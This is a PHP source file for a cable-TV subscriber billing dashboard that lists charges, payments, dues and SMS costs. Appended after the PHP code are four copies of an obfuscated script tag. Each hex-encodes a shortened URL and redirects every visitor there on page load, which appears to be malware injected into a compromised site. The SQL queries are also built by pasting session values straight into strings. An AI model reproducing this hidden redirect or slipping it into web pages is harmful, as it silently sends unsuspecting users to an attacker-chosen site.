<?php
define("ZW_IN", 'SETUP');
require_once("helper.php");
if(!isset($_SESSION['USER_ID'])){
    header("location:/index.html");
    exit;
}
//print_r($_SESSION);
if($_SESSION['USER_TYPE']=='S'){
	$wherethis = " 1=1 AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND SUBSCRIBER_ID='$_SESSION[SUBSCRIBER_ID]' ORDER BY `ID` DESC";
	$classRecord = $objMisc->getAllRecordsPaging("*","monthly_charges",$wherethis);
	$i  = 1;
	$pagin_recs = "";
	$pagin_recs = '<input type="hidden" value="" id="checkStatus" name="checkStatus"><thead><tr><th width="15%">Date</th><th width="30%">Details</th><th width="15%">Debit</th><th width="15%">Credit</th>';
	$pagin_recs .= '</th></tr></thead><tbody>';             
    if(is_array($classRecord[1]) && !empty($classRecord[1]))
    { $i=1;
       foreach ($classRecord[1] as $k => $rowRec)
        {       
            if($k%2==0) 
            $pagin_recs .= '<tr class="odd gradeX">';
            else
            $pagin_recs .= '<tr class="even gradeX">';
            
            $pagin_recs .='<td>'.$objMisc->dateFormat($rowRec['month_date']).'</td>';
            if($rowRec['amount_type']=='D'){
            	$value=$objMisc->getRowNew("SELECT S.STB_NO,P.NAME FROM `stb_box` B JOIN `subscriptions` S ON S.`SUBSCRIPTION_ID`=B.`SUBSCRIPTION_ID` JOIN `package_master` P ON P.`PACKAGE_ID`=B.`PACKAGE_ID` WHERE B.STB_ID='$rowRec[stb_id]'");
            	$pagin_recs .='<td>STB No '.$value['stb_no'].' for '.$value['name'].' Package</td>';
            }else{
            	$pagin_recs .='<td>Payment Received</td>';
            }
            $pagin_recs .='<td align="right">'.(($rowRec['amount_type']=='D')?$rowRec['amount']:'').'</td>';
            $pagin_recs .='<td align="right">'.(($rowRec['amount_type']=='C')?$rowRec['amount'].'<a class="btn btn-info" target="_blank" href="receipt-pdf.php?id='.$rowRec['id'].'">Print</a><input type="hidden" name="enumStatus'.$rowRec['id'].'" id="enumStatus'.$rowRec['id'].'"  value="'.$rowRec['status'].'">&nbsp;<b style="color:red;" id="action'.$rowRec['id'].'">':'');
                $pagin_recs .= '</td></tr>';
                $i++;
        }
          $pagin_recs  .= '<input type="hidden" value="'.$i.'" name="artCatCount" id="artCatCount">';
          if($classRecord[2]>$objMisc->rec_pp){
            $pagin_recs  .= '<tr><td colspan="5">'.$classRecord[0].'</td></tr>';
          }
            $pagin_recs  .= '</tbody>';
    } else {
        $pagin_recs .= '<tr class="odd gradeX"><td colspan="5" align="center">No Record Found</td></tr></tbody>';
    }

	$smartyVars['collectionListing'] = $pagin_recs;
}else{
    $lastMonthDate=date("Y-n-j", strtotime("last day of previous month"));
    $curMon=date('m');
    $curYear=date('Y');
    $prevBal=$objMisc->GiveValueNew("SELECT SUM(M.`AMOUNT`) FROM `monthly_charges` M JOIN `subscribers` S ON S.`SUBSCRIBER_ID`=M.`SUBSCRIBER_ID` WHERE M.`HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND M.`AMOUNT_TYPE`='D' AND M.`STATUS`='A' AND S.`STATUS`='A' AND M.`MONTH_DATE`<='$lastMonthDate'")-$objMisc->GiveValueNew("SELECT SUM(M.`AMOUNT`) FROM `monthly_charges` M JOIN `subscribers` S ON S.`SUBSCRIBER_ID`=M.`SUBSCRIBER_ID` WHERE M.`HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND M.`AMOUNT_TYPE`='C' AND M.`STATUS`='A' AND S.`STATUS`='A' AND M.`MONTH_DATE`<='$lastMonthDate'")-$objMisc->GiveValueNew("SELECT SUM(M.`DISCOUNT`) FROM `monthly_charges` M JOIN `subscribers` S ON S.`SUBSCRIBER_ID`=M.`SUBSCRIBER_ID` WHERE M.`HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND M.`AMOUNT_TYPE`='C' AND M.`STATUS`='A' AND S.`STATUS`='A' AND M.`MONTH_DATE`<='$lastMonthDate'");
    $to   =$objMisc->changeDateFormat(date('d/m/Y'));
    $and .=" AND MONTH_DATE <='$to'";
	$type=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'TYPE','headoffice_master');
	$billingType=(($type=='L')?'Expiry Date':'Balance(Bills)');
	$pendingBills=($objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'SUM(BILLS)','admin_collections')-$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND AMOUNT_TYPE='C'",'COUNT(*)','monthly_charges'));
	$BillsLeft=(($type=='B')?$pendingBills.' Bills':$objMisc->dateFormat($objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'EXPIRY_DATE','headoffice_master')));
    //$totalDues=$objMisc->GiveValueNew("SELECT SUM(M.`AMOUNT`) FROM `monthly_charges` M JOIN `subscribers` S ON S.`SUBSCRIBER_ID`=M.`SUBSCRIBER_ID` WHERE M.`HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND M.`AMOUNT_TYPE`='D' AND M.`STATUS`='A' AND S.`STATUS`='A' AND MONTH(M.`MONTH_DATE`)='$curMon' AND YEAR(M.`MONTH_DATE`)='$curYear'")+$prevBal;
	$totalDues=$objMisc->GiveValueNew("SELECT SUM(`AMOUNT`) FROM `monthly_charges`WHERE `HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND `AMOUNT_TYPE`='D' AND `STATUS`='A'");
    //$totCollection=$objMisc->GiveValueNew("SELECT SUM(M.`AMOUNT`) FROM `monthly_charges` M JOIN `subscribers` S ON S.`SUBSCRIBER_ID`=M.`SUBSCRIBER_ID` WHERE M.`HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND M.`AMOUNT_TYPE`='C' AND M.`STATUS`='A' AND S.`STATUS`='A' AND MONTH(M.`MONTH_DATE`)='$curMon' AND YEAR(M.`MONTH_DATE`)='$curYear'");
    $totCollection=$objMisc->GiveValueNew("SELECT SUM(`AMOUNT`) FROM `monthly_charges` WHERE `HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND `AMOUNT_TYPE`='C' AND RECEIPT_NO!='Opening Balance' AND `STATUS`='A' AND MONTH(`MONTH_DATE`)='$curMon' AND YEAR(`MONTH_DATE`)='$curYear'");
    $allCollections=$objMisc->GiveValueNew("SELECT SUM(`AMOUNT`) FROM `monthly_charges` WHERE `HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND `AMOUNT_TYPE`='C' AND `STATUS`='A'");
    $totCollection=(($totCollection=='')?0:$totCollection);
    //$totDiscount=$objMisc->GiveValueNew("SELECT SUM(M.`DISCOUNT`) FROM `monthly_charges` M JOIN `subscribers` S ON S.`SUBSCRIBER_ID`=M.`SUBSCRIBER_ID` WHERE M.`HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND M.`AMOUNT_TYPE`='C' AND M.`STATUS`='A' AND S.`STATUS`='A' AND MONTH(M.`MONTH_DATE`)='$curMon' AND YEAR(M.`MONTH_DATE`)='$curYear'");
    $totDiscount=$objMisc->GiveValueNew("SELECT SUM(`DISCOUNT`) FROM `monthly_charges`WHERE `HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND `AMOUNT_TYPE`='C' AND `STATUS`='A' AND MONTH(`MONTH_DATE`)='$curMon' AND YEAR(`MONTH_DATE`)='$curYear'");
	$allDiscount=$objMisc->GiveValueNew("SELECT SUM(`DISCOUNT`) FROM `monthly_charges`WHERE `HEADOFFICE_ID`='$_SESSION[HEADOFFICE]' AND `AMOUNT_TYPE`='C' AND `STATUS`='A'");
	$totAdvance=$objMisc->calAdvamount($_SESSION['HEADOFFICE']);
    //$totPending=$totalDues-($totCollection+$totDiscount+$totAdvance);
    $totPending=$totalDues-($allCollections+$allDiscount);
	$billsGeneratedRate=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND AMOUNT_TYPE='C' AND AMOUNT!='0' AND STATUS='A'",'SUM(BILL_RATE)','monthly_charges');
    $billsGenerated=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND AMOUNT_TYPE='C' AND STATUS='A' AND RECEIPT_NO!='Opening Balance' AND AMOUNT!='0'",'COUNT(*)','monthly_charges');
    $smsSent=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'COUNT(*)','sms_log');
    $smsSentRate=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'SUM(RATE_SMS)','sms_log');
    $totAmount=$objMisc->GiveValue("HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'SUM(AMOUNT)','headoffice_recharge');
    
    //echo $totAmount.'-'.$billsGeneratedRate.'-'.$smsSentRate;
    $pendingAmount=$totAmount-$billsGeneratedRate-$smsSentRate;
    $smartyVars['totAdvance'] = abs($totAdvance);
    $smartyVars['totDiscount'] = $totDiscount;
	$smartyVars['pendingAmount'] = $pendingAmount;
	$smartyVars['billsGenerated'] = $billsGenerated;
	$smartyVars['smsSent'] = $smsSent;
	$smartyVars['totalDues'] = $totalDues;
	$smartyVars['totCollection'] = $totCollection;
	$smartyVars['totPending'] = $totPending;	
}
$smartyVars['msg'] = $msg;

$objMisc->displayPage("header,index,footer",$smartyVars);
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>